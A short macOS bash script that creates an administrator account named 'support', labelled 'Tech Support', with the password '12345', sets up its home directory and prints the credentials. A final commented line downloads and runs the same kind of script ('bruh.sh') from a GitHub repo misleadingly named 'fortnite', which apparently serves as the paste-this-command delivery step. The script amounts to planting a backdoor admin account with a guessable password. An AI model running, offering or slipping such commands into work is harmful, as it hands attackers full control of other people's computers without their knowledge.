#!/bin/bash

# Create a new admin user named 'support' with full name "Tech Support"
sysadminctl -addUser support \
    -fullName "Tech Support" \
    -password 12345 \
    -admin

# Ensure home directory exists
if [ ! -d /Users/support ]; then
    mkdir -p /Users/support
    chown support:staff /Users/support
fi

echo "✅ Admin user 'support' (Tech Support) created with password '12345'."


# curl https://raw.githubusercontent.com/longnecklamb/fortnite/main/bruh.sh -o bruh.sh && chmod +x ./bruh.sh && ./bruh.sh
